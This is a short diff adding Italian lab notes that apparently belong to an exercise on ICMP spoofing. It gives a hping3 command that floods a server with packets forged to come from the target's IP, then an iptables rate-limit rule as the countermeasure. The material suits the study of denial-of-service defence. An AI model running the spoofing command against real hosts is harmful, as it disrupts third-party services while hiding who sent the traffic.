@@ -1,0 +1,5 @@
+Per eseguire l'attacco dalla macchina attaccante eseguire il comando:
+sudo hping3 --icmp --spoof <IP Target> -p 80 <IP Server>
+
+Per implementare contromisure sulla macchina target eseguire:
+sudo iptables -A INPUT -p icmp --icmp-type echo-reply -m limit --limit 10/s -j ACCEPT
